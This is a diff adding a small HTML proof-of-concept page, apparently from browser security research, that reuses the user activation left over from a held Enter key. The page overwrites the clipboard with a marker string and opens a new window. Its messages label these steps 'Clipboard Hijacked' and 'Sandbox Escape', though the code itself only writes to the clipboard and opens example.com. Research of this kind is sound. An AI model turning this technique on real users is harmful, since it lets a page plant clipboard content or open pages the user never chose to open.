@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Sensitive Action Proof (Origin B)</title>
+</head>
+
+<body style="background-color: #e8f5e9; text-align: center; font-family: sans-serif;">
+    <h3>Situs B (Target Origin - GitHub)</h3>
+    <h1 style="color: red;">LEPASKAN TOMBOL "ENTER" SEKARANG!</h1>
+
+    <div id="status" style="border: 2px solid black; padding: 20px; margin: 20px;">
+        Menunggu Ghost Gesture...
+    </div>
+
+    <script>
+        window.addEventListener('keyup', async (e) => {
+            if (e.key === 'Enter') {
+                const isActive = navigator.userActivation.isActive;
+
+                if (isActive) {
+                    try {
+                        await navigator.clipboard.writeText("HACKED_BY_GHOST_GESTURE_12345");
+                        document.getElementById('status').innerHTML +=
+                            "<p style='color:red;'>✅ ACTION 1: Clipboard Hijacked! (Try to paste anywhere)</p>";
+                    } catch (err) { console.log("Clipboard failed"); }
+                    document.getElementById('status').innerHTML +=
+                        "<p style='color:red;'>✅ ACTION 3: Executing Sandbox Escape...</p>";
+                    window.open('https://example.com', '_blank');
+                }
+            }
+        });
+    </script>
+</body>
+
+</html>
